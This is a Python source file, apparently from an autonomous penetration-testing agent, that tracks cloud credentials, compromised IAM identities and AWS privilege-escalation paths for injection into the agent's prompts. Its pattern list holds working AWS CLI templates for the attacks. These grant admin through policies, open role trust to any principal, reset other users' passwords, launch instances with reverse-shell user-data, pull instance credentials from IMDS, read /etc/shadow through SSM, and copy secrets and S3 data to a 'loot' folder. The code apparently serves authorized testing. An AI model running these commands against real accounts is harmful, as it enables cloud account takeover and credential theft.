"""Cloud-native state model — IAM graph, credential lifecycle, permission-keyed escalation.

Represents the cloud execution substrate as a distinct state model from the host
attack graph. Cloud work operates against an IAM permission boundary via API calls,
not shells and kernel primitives. This model owns:

- Identity graph: roles, users, groups, policies, trust relationships
- Credential lifecycle: temporary STS creds with expiry tracking
- Permission-to-escalation mapping: enumerated grants → candidate privesc paths
- Provider abstraction: AWS first, GCP/Azure as retrievable knowledge packs
- Cloud guardrails: read-only default, mutation gates, region/account allowlists
"""

import json
import re
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# IAM Identity Graph
# ---------------------------------------------------------------------------

@dataclass
class CloudCredential:
    """A set of cloud credentials with expiry tracking."""
    provider: str  # aws, gcp, azure
    identity_arn: str  # arn:aws:iam::123:role/name or equiv
    access_key: str
    secret_key: str
    session_token: str = ""
    region: str = "us-east-1"
    expires_at: str = ""  # ISO 8601
    source: str = ""  # how obtained: imds, ssrf, env, config_file, sts_assume
    account_id: str = ""
    is_root: bool = False

    @property
    def is_expired(self) -> bool:
        if not self.expires_at:
            return False  # Long-lived creds don't expire
        try:
            exp = datetime.fromisoformat(self.expires_at.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) >= exp
        except (ValueError, TypeError):
            return False

    @property
    def minutes_remaining(self) -> int | None:
        if not self.expires_at:
            return None
        try:
            exp = datetime.fromisoformat(self.expires_at.replace("Z", "+00:00"))
            delta = exp - datetime.now(timezone.utc)
            return max(0, int(delta.total_seconds() / 60))
        except (ValueError, TypeError):
            return None

    @property
    def short_id(self) -> str:
        """Short display identifier."""
        if self.identity_arn:
            parts = self.identity_arn.split("/")
            return parts[-1] if len(parts) > 1 else self.identity_arn.split(":")[-1]
        return self.access_key[:8] + "..."


@dataclass
class IAMIdentity:
    """A cloud identity (user, role, service account)."""
    arn: str
    identity_type: str  # user, role, group, service_account, instance_profile
    name: str
    provider: str = "aws"
    account_id: str = ""
    policies: list[str] = field(default_factory=list)  # attached policy ARNs/names
    inline_policies: list[dict] = field(default_factory=list)
    permissions: list[str] = field(default_factory=list)  # enumerated allowed actions
    trust_policy: dict = field(default_factory=dict)  # who can assume this role
    tags: dict = field(default_factory=dict)
    path: str = "/"
    is_compromised: bool = False
    compromise_source: str = ""  # ssrf, config_leak, lateral


@dataclass
class IAMPolicy:
    """A cloud IAM policy with parsed statements."""
    arn: str
    name: str
    provider: str = "aws"
    statements: list[dict] = field(default_factory=list)
    is_managed: bool = True  # AWS managed vs customer managed
    attachment_count: int = 0


@dataclass
class TrustRelationship:
    """A trust edge in the IAM graph: principal A can assume/access B."""
    source_arn: str  # who can assume
    target_arn: str  # what can be assumed
    trust_type: str  # assume_role, federation, service_linked, cross_account
    conditions: dict = field(default_factory=dict)
    provider: str = "aws"


@dataclass
class EscalationPath:
    """A candidate privilege escalation path derived from enumerated permissions."""
    name: str
    permissions_required: list[str]
    permissions_present: list[str]
    missing_permissions: list[str] = field(default_factory=list)
    viability: str = "candidate"  # candidate, validated, blocked, exploited
    description: str = ""
    commands: list[str] = field(default_factory=list)
    source_identity: str = ""
    target_identity: str = ""
    provider: str = "aws"
    blocked_reason: str = ""


# ---------------------------------------------------------------------------
# Cloud Resource Tracking
# ---------------------------------------------------------------------------

@dataclass
class CloudResource:
    """A cloud resource relevant to the attack surface."""
    arn: str
    resource_type: str  # s3_bucket, lambda, ec2_instance, codebuild_project, sqs_queue
    name: str
    provider: str = "aws"
    region: str = ""
    config: dict = field(default_factory=dict)  # security-relevant config
    access_level: str = ""  # public, authenticated, private
    notes: str = ""


# ---------------------------------------------------------------------------
# Permission-to-Escalation Mapping (the IAM playbook engine)
# ---------------------------------------------------------------------------

# AWS permission → escalation path templates.
# Keyed on the permissions the agent ACTUALLY has.
# When enumerated grants match, the path becomes a candidate.
AWS_PRIVESC_PATTERNS: list[dict] = [
    {
        "name": "CreatePolicyVersion",
        "trigger_perms": ["iam:CreatePolicyVersion"],
        "description": "Create a new policy version with admin privileges, set as default",
        "commands": [
            'aws iam create-policy-version --policy-arn {policy_arn} --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\' --set-as-default',
        ],
    },
    {
        "name": "SetDefaultPolicyVersion",
        "trigger_perms": ["iam:SetDefaultPolicyVersion"],
        "description": "Switch to a more permissive existing policy version",
        "commands": [
            "aws iam list-policy-versions --policy-arn {policy_arn}",
            "aws iam set-default-policy-version --policy-arn {policy_arn} --version-id {version_id}",
        ],
    },
    {
        "name": "PassRole+Lambda",
        "trigger_perms": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
        "description": "Create a Lambda with a privileged role, invoke it to execute as that role",
        "commands": [
            "aws iam list-roles --query 'Roles[?contains(AssumeRolePolicyDocument.Statement[0].Principal.Service, `lambda`)]'",
            "aws lambda create-function --function-name escalate --runtime python3.12 --role {role_arn} --handler index.handler --zip-file fileb://payload.zip",
            "aws lambda invoke --function-name escalate /tmp/out.json",
        ],
    },
    {
        "name": "PassRole+EC2",
        "trigger_perms": ["iam:PassRole", "ec2:RunInstances"],
        "description": "Launch an EC2 instance with a privileged instance profile, access via IMDS",
        "commands": [
            "aws ec2 run-instances --image-id {ami_id} --instance-type t3.micro --iam-instance-profile Name={profile_name} --user-data file://reverse_shell.sh",
        ],
    },
    {
        "name": "PassRole+CodeBuild",
        "trigger_perms": ["iam:PassRole", "codebuild:CreateProject", "codebuild:StartBuild"],
        "description": "Create a CodeBuild project with a privileged role; if privilegedMode=true, container escape to host",
        "commands": [
            "aws codebuild create-project --name escalate --source type=NO_SOURCE --environment type=LINUX_CONTAINER,computeType=BUILD_GENERAL1_SMALL,image=aws/codebuild/standard:7.0,privilegedMode=true --service-role {role_arn}",
            "aws codebuild start-build --project-name escalate --buildspec-override 'version: 0.2\\nphases:\\n  build:\\n    commands:\\n      - curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        ],
    },
    {
        "name": "PassRole+CloudFormation",
        "trigger_perms": ["iam:PassRole", "cloudformation:CreateStack"],
        "description": "Create a CloudFormation stack with a privileged role to provision admin resources",
        "commands": [
            "aws cloudformation create-stack --stack-name escalate --template-body file://admin_user.yaml --role-arn {role_arn} --capabilities CAPABILITY_NAMED_IAM",
        ],
    },
    {
        "name": "PassRole+Glue",
        "trigger_perms": ["iam:PassRole", "glue:CreateDevEndpoint"],
        "description": "Create a Glue dev endpoint with a privileged role, SSH into it",
        "commands": [
            "aws glue create-dev-endpoint --endpoint-name escalate --role-arn {role_arn} --public-key file://~/.ssh/id_rsa.pub",
        ],
    },
    {
        "name": "AttachUserPolicy",
        "trigger_perms": ["iam:AttachUserPolicy"],
        "description": "Attach AdministratorAccess policy to current user",
        "commands": [
            "aws iam attach-user-policy --user-name {username} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        ],
    },
    {
        "name": "AttachRolePolicy",
        "trigger_perms": ["iam:AttachRolePolicy"],
        "description": "Attach AdministratorAccess policy to current role",
        "commands": [
            "aws iam attach-role-policy --role-name {role_name} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
        ],
    },
    {
        "name": "PutUserPolicy",
        "trigger_perms": ["iam:PutUserPolicy"],
        "description": "Add an inline admin policy to current user",
        "commands": [
            'aws iam put-user-policy --user-name {username} --policy-name admin --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
        ],
    },
    {
        "name": "PutRolePolicy",
        "trigger_perms": ["iam:PutRolePolicy"],
        "description": "Add an inline admin policy to current role",
        "commands": [
            'aws iam put-role-policy --role-name {role_name} --policy-name admin --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'',
        ],
    },
    {
        "name": "CreateAccessKey",
        "trigger_perms": ["iam:CreateAccessKey"],
        "description": "Create access keys for another user (persistence / lateral)",
        "commands": [
            "aws iam create-access-key --user-name {target_username}",
        ],
    },
    {
        "name": "CreateLoginProfile",
        "trigger_perms": ["iam:CreateLoginProfile"],
        "description": "Create console password for another user",
        "commands": [
            "aws iam create-login-profile --user-name {target_username} --password 'P@ssw0rd!' --no-password-reset-required",
        ],
    },
    {
        "name": "UpdateLoginProfile",
        "trigger_perms": ["iam:UpdateLoginProfile"],
        "description": "Reset console password for another user",
        "commands": [
            "aws iam update-login-profile --user-name {target_username} --password 'P@ssw0rd!' --no-password-reset-required",
        ],
    },
    {
        "name": "UpdateAssumeRolePolicy",
        "trigger_perms": ["iam:UpdateAssumeRolePolicy"],
        "description": "Modify a role's trust policy to allow yourself to assume it",
        "commands": [
            'aws iam update-assume-role-policy --role-name {role_name} --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"sts:AssumeRole"}]}\'',
        ],
    },
    {
        "name": "AssumeRole",
        "trigger_perms": ["sts:AssumeRole"],
        "description": "Assume a more privileged role directly",
        "commands": [
            "aws sts assume-role --role-arn {role_arn} --role-session-name escalate",
        ],
    },
    {
        "name": "SSM_SendCommand",
        "trigger_perms": ["ssm:SendCommand"],
        "description": "Execute commands on EC2 instances via SSM Run Command",
        "commands": [
            'aws ssm send-command --instance-ids {instance_id} --document-name AWS-RunShellScript --parameters commands=["id;cat /etc/shadow"]',
        ],
    },
    {
        "name": "SQS_MessageInjection",
        "trigger_perms": ["sqs:SendMessage"],
        "description": "Inject messages into worker queues; if workers use unsafe deserialization, RCE",
        "commands": [
            "aws sqs list-queues",
            "aws sqs send-message --queue-url {queue_url} --message-body '{payload}'",
        ],
    },
    {
        "name": "SecretsManager_Read",
        "trigger_perms": ["secretsmanager:GetSecretValue"],
        "description": "Read secrets from Secrets Manager (database passwords, API keys)",
        "commands": [
            "aws secretsmanager list-secrets",
            "aws secretsmanager get-secret-value --secret-id {secret_id}",
        ],
    },
    {
        "name": "S3_DataExfil",
        "trigger_perms": ["s3:GetObject"],
        "description": "Read objects from S3 buckets (config files, backups, credentials)",
        "commands": [
            "aws s3 ls",
            "aws s3 ls s3://{bucket_name} --recursive",
            "aws s3 cp s3://{bucket_name}/{key} /tmp/loot/",
        ],
    },
    {
        "name": "EC2_UserData",
        "trigger_perms": ["ec2:DescribeInstanceAttribute"],
        "description": "Read EC2 instance user-data (often contains bootstrap secrets)",
        "commands": [
            "aws ec2 describe-instance-attribute --instance-id {instance_id} --attribute userData | base64 -d",
        ],
    },
]


# ---------------------------------------------------------------------------
# Cloud Guardrails
# ---------------------------------------------------------------------------

# Actions classified as mutating (write/delete). Read-only actions are allowed by default.
# The cloud agent must get explicit confirmation before executing mutating actions.
AWS_MUTATING_PREFIXES = frozenset({
    "iam:Create", "iam:Delete", "iam:Put", "iam:Attach", "iam:Detach",
    "iam:Update", "iam:Add", "iam:Remove", "iam:Set",
    "ec2:Run", "ec2:Terminate", "ec2:Create", "ec2:Delete", "ec2:Modify",
    "s3:Put", "s3:Delete", "s3:Create",
    "lambda:Create", "lambda:Delete", "lambda:Update",
    "cloudformation:Create", "cloudformation:Delete", "cloudformation:Update",
    "codebuild:Create", "codebuild:Delete", "codebuild:Start",
    "sqs:Send", "sqs:Delete", "sqs:Create",
    "ssm:Send",
    "secretsmanager:Create", "secretsmanager:Delete", "secretsmanager:Put",
    "sts:AssumeRole",
})


def is_mutating_action(action: str) -> bool:
    """Check if an AWS API action is mutating (vs read-only)."""
    return any(action.startswith(prefix) for prefix in AWS_MUTATING_PREFIXES)


def classify_command_cloud_risk(cmd: str) -> str:
    """Classify a cloud CLI command's blast radius.

    Returns: 'read' | 'write' | 'destructive' | 'unknown'
    """
    cmd_lower = cmd.lower().strip()

    destructive_patterns = [
        r"aws\s+\S+\s+delete-",
        r"aws\s+\S+\s+terminate-",
        r"aws\s+ec2\s+terminate-instances",
        r"aws\s+s3\s+rm\s+s3://",
        r"aws\s+cloudformation\s+delete-stack",
        r"--force\b",
    ]
    for pat in destructive_patterns:
        if re.search(pat, cmd_lower):
            return "destructive"

    write_patterns = [
        r"aws\s+\S+\s+(create-|put-|update-|attach-|detach-|start-|send-|run-)",
        r"aws\s+s3\s+cp\s+\S+\s+s3://",  # upload to S3
        r"aws\s+iam\s+",
    ]
    for pat in write_patterns:
        if re.search(pat, cmd_lower):
            # iam list/get are reads
            if re.search(r"aws\s+iam\s+(list-|get-|generate-credential)", cmd_lower):
                return "read"
            return "write"

    read_patterns = [
        r"aws\s+\S+\s+(list-|describe-|get-)",
        r"aws\s+sts\s+get-caller-identity",
        r"aws\s+s3\s+ls",
        r"aws\s+s3\s+cp\s+s3://\S+\s+/",  # download from S3
    ]
    for pat in read_patterns:
        if re.search(pat, cmd_lower):
            return "read"

    if "aws " in cmd_lower:
        return "unknown"
    return "unknown"


# ---------------------------------------------------------------------------
# CloudState — the aggregate state model for cloud substrates
# ---------------------------------------------------------------------------

class CloudState:
    """Cloud-native state model attached to an Engagement.

    Tracks identities, credentials, permissions, escalation paths, resources,
    and trust relationships across cloud providers.
    """

    def __init__(self):
        self.credentials: list[CloudCredential] = []
        self.identities: list[IAMIdentity] = []
        self.policies: list[IAMPolicy] = []
        self.trust_relationships: list[TrustRelationship] = []
        self.escalation_paths: list[EscalationPath] = []
        self.resources: list[CloudResource] = []
        self.account_ids: set[str] = set()
        self.regions_seen: set[str] = set()
        self.provider: str = ""  # primary provider detected
        self.endpoint_overrides: dict[str, str] = {}  # service -> url (LocalStack etc.)
        self.guardrails_enabled: bool = True
        self.allowed_accounts: set[str] = set()  # empty = allow all
        self.allowed_regions: set[str] = set()  # empty = allow all
        self.mutation_log: list[dict] = []  # audit trail of mutating actions

    # --- Credential Management ---

    def add_credential(self, cred: CloudCredential) -> None:
        """Add a cloud credential, deduplicating by access key."""
        for existing in self.credentials:
            if existing.access_key == cred.access_key:
                existing.session_token = cred.session_token
                existing.expires_at = cred.expires_at
                return
        self.credentials.append(cred)
        if cred.account_id:
            self.account_ids.add(cred.account_id)
        if cred.region:
            self.regions_seen.add(cred.region)
        if not self.provider:
            self.provider = cred.provider

    def active_credentials(self) -> list[CloudCredential]:
        """Return non-expired credentials, newest first."""
        active = [c for c in self.credentials if not c.is_expired]
        active.sort(key=lambda c: c.expires_at or "9999", reverse=True)
        return active

    def best_credential(self, provider: str = "aws") -> CloudCredential | None:
        """Return the most privileged non-expired credential for a provider."""
        active = [c for c in self.active_credentials() if c.provider == provider]
        # Prefer root > named role > unnamed
        for c in active:
            if c.is_root:
                return c
        return active[0] if active else None

    def expiry_warnings(self) -> list[str]:
        """Return warnings for credentials expiring soon."""
        warnings = []
        for c in self.credentials:
            remaining = c.minutes_remaining
            if remaining is not None and remaining <= 15 and not c.is_expired:
                warnings.append(
                    f"CREDENTIAL EXPIRY: {c.short_id} expires in {remaining} min"
                )
            elif c.is_expired:
                warnings.append(f"CREDENTIAL EXPIRED: {c.short_id}")
        return warnings

    # --- Identity Graph ---

    def add_identity(self, identity: IAMIdentity) -> None:
        """Add or update an IAM identity."""
        for existing in self.identities:
            if existing.arn == identity.arn:
                if identity.permissions:
                    existing.permissions = list(set(existing.permissions + identity.permissions))
                if identity.policies:
                    existing.policies = list(set(existing.policies + identity.policies))
                if identity.trust_policy:
                    existing.trust_policy = identity.trust_policy
                existing.is_compromised = existing.is_compromised or identity.is_compromised
                return
        self.identities.append(identity)
        if identity.account_id:
            self.account_ids.add(identity.account_id)

    def add_trust(self, trust: TrustRelationship) -> None:
        """Add a trust relationship edge."""
        for existing in self.trust_relationships:
            if (existing.source_arn == trust.source_arn and
                    existing.target_arn == trust.target_arn):
                return  # Already tracked
        self.trust_relationships.append(trust)

    def compromised_identities(self) -> list[IAMIdentity]:
        return [i for i in self.identities if i.is_compromised]

    def identity_by_arn(self, arn: str) -> IAMIdentity | None:
        for i in self.identities:
            if i.arn == arn:
                return i
        return None

    # --- Permission-Keyed Escalation ---

    def evaluate_escalation_paths(self, identity_arn: str = "") -> list[EscalationPath]:
        """Score all IAM escalation patterns against enumerated permissions.

        If identity_arn is specified, only checks permissions for that identity.
        Otherwise checks all compromised identities.
        """
        targets = []
        if identity_arn:
            ident = self.identity_by_arn(identity_arn)
            if ident:
                targets = [ident]
        else:
            targets = self.compromised_identities()

        if not targets:
            return []

        new_paths = []
        for identity in targets:
            perms_set = set(identity.permissions)
            # Also check wildcard permissions
            has_wildcard = "*" in perms_set or any(
                p.endswith(":*") for p in perms_set
            )

            for pattern in AWS_PRIVESC_PATTERNS:
                trigger = pattern["trigger_perms"]
                present = [p for p in trigger if p in perms_set or has_wildcard]
                missing = [p for p in trigger if p not in present]

                if not present:
                    continue

                viability = "candidate" if not missing else "partial"
                if has_wildcard:
                    viability = "candidate"
                    missing = []

                path = EscalationPath(
                    name=pattern["name"],
                    permissions_required=trigger,
                    permissions_present=present,
                    missing_permissions=missing,
                    viability=viability,
                    description=pattern["description"],
                    commands=list(pattern.get("commands", [])),
                    source_identity=identity.arn,
                    provider="aws",
                )

                # Dedup
                existing = [
                    p for p in self.escalation_paths
                    if p.name == path.name and p.source_identity == path.source_identity
                ]
                if not existing:
                    self.escalation_paths.append(path)
                    new_paths.append(path)

        return new_paths

    def viable_paths(self) -> list[EscalationPath]:
        """Return escalation paths that are viable (all permissions present)."""
        return [p for p in self.escalation_paths
                if p.viability in ("candidate", "validated")]

    # --- Resource Tracking ---

    def add_resource(self, resource: CloudResource) -> None:
        for existing in self.resources:
            if existing.arn == resource.arn:
                existing.config.update(resource.config)
                return
        self.resources.append(resource)
        if resource.region:
            self.regions_seen.add(resource.region)

    # --- Guardrail Enforcement ---

    def check_guardrails(self, cmd: str) -> tuple[bool, str]:
        """Check if a command is allowed under current guardrails.

        Returns (allowed, reason).
        """
        if not self.guardrails_enabled:
            return True, "guardrails disabled"

        risk = classify_command_cloud_risk(cmd)

        if risk == "destructive":
            return False, (
                "BLOCKED: destructive cloud action. Requires explicit operator "
                "approval. Use 'cloud guardrails off' to disable."
            )

        # In CTF mode, allow writes. In LE/RT, gate them.
        # (The agent's engagement_mode is checked at dispatch time by the caller.)
        return True, f"cloud_risk={risk}"

    def log_mutation(self, cmd: str, identity: str, result: str = "") -> None:
        self.mutation_log.append({
            "command": cmd[:500],
            "identity": identity,
            "result": result[:200],
            "time": datetime.now().isoformat(),
        })

    # --- Serialization ---

    def to_dict(self) -> dict:
        return {
            "credentials": [asdict(c) for c in self.credentials],
            "identities": [asdict(i) for i in self.identities],
            "policies": [asdict(p) for p in self.policies],
            "trust_relationships": [asdict(t) for t in self.trust_relationships],
            "escalation_paths": [asdict(e) for e in self.escalation_paths],
            "resources": [asdict(r) for r in self.resources],
            "account_ids": sorted(self.account_ids),
            "regions_seen": sorted(self.regions_seen),
            "provider": self.provider,
            "endpoint_overrides": self.endpoint_overrides,
            "guardrails_enabled": self.guardrails_enabled,
            "allowed_accounts": sorted(self.allowed_accounts),
            "allowed_regions": sorted(self.allowed_regions),
            "mutation_log": self.mutation_log[-50:],
        }

    @classmethod
    def from_dict(cls, data: dict) -> "CloudState":
        cs = cls()
        for cd in data.get("credentials", []):
            cs.credentials.append(CloudCredential(**cd))
        for idata in data.get("identities", []):
            cs.identities.append(IAMIdentity(**idata))
        for pd in data.get("policies", []):
            cs.policies.append(IAMPolicy(**pd))
        for td in data.get("trust_relationships", []):
            cs.trust_relationships.append(TrustRelationship(**td))
        for ed in data.get("escalation_paths", []):
            cs.escalation_paths.append(EscalationPath(**ed))
        for rd in data.get("resources", []):
            cs.resources.append(CloudResource(**rd))
        cs.account_ids = set(data.get("account_ids", []))
        cs.regions_seen = set(data.get("regions_seen", []))
        cs.provider = data.get("provider", "")
        cs.endpoint_overrides = data.get("endpoint_overrides", {})
        cs.guardrails_enabled = data.get("guardrails_enabled", True)
        cs.allowed_accounts = set(data.get("allowed_accounts", []))
        cs.allowed_regions = set(data.get("allowed_regions", []))
        cs.mutation_log = data.get("mutation_log", [])
        return cs

    # --- Prompt Injection ---

    def for_prompt(self) -> str:
        """Format cloud state for injection into agent prompts."""
        parts = []

        # Credential status
        active = self.active_credentials()
        if active:
            parts.append("## Cloud Credentials")
            for c in active:
                remaining = c.minutes_remaining
                exp_str = f" (expires in {remaining} min)" if remaining is not None else " (long-lived)"
                root_str = " [ROOT]" if c.is_root else ""
                parts.append(
                    f"- [{c.provider.upper()}] {c.short_id}{root_str}: "
                    f"{c.identity_arn}{exp_str} (source: {c.source})"
                )

        # Expiry warnings
        warnings = self.expiry_warnings()
        if warnings:
            parts.append("\n**⚠ CREDENTIAL WARNINGS:**")
            for w in warnings:
                parts.append(f"- {w}")

        # Compromised identities + permissions
        compromised = self.compromised_identities()
        if compromised:
            parts.append("\n## Compromised Cloud Identities")
            for ident in compromised:
                parts.append(f"- {ident.arn} ({ident.identity_type})")
                if ident.permissions:
                    # Show first 15 permissions
                    perm_str = ", ".join(sorted(ident.permissions)[:15])
                    if len(ident.permissions) > 15:
                        perm_str += f" (+{len(ident.permissions) - 15} more)"
                    parts.append(f"  Permissions: {perm_str}")

        # Viable escalation paths
        viable = self.viable_paths()
        if viable:
            parts.append("\n## Viable Escalation Paths (permission-keyed)")
            for p in viable:
                status = f" [{p.viability}]"
                parts.append(f"- **{p.name}**{status}: {p.description}")
                parts.append(f"  Requires: {', '.join(p.permissions_required)}")
                if p.commands:
                    parts.append(f"  Commands: {p.commands[0][:120]}...")

        # Trust relationships
        if self.trust_relationships:
            parts.append(f"\n## Trust Relationships ({len(self.trust_relationships)})")
            for t in self.trust_relationships[:10]:
                parts.append(f"- {t.source_arn} → {t.target_arn} ({t.trust_type})")

        # Interesting resources
        interesting = [r for r in self.resources
                       if r.access_level in ("public", "authenticated") or r.notes]
        if interesting:
            parts.append(f"\n## Cloud Resources ({len(interesting)} notable)")
            for r in interesting[:10]:
                parts.append(f"- [{r.resource_type}] {r.name}: {r.notes or r.access_level}")

        # Endpoint overrides (LocalStack etc.)
        if self.endpoint_overrides:
            parts.append("\n## Endpoint Overrides")
            for svc, url in self.endpoint_overrides.items():
                parts.append(f"- {svc}: {url}")

        # Accounts and regions
        if self.account_ids:
            parts.append(f"\nAccounts: {', '.join(sorted(self.account_ids))}")
        if self.regions_seen:
            parts.append(f"Regions: {', '.join(sorted(self.regions_seen))}")

        return "\n".join(parts) if parts else ""

    def summary_oneliner(self) -> str:
        """One-line summary for compact display."""
        active = len(self.active_credentials())
        compromised = len(self.compromised_identities())
        viable = len(self.viable_paths())
        return (
            f"Cloud: {active} active creds, {compromised} compromised identities, "
            f"{viable} escalation paths, {len(self.resources)} resources"
        )
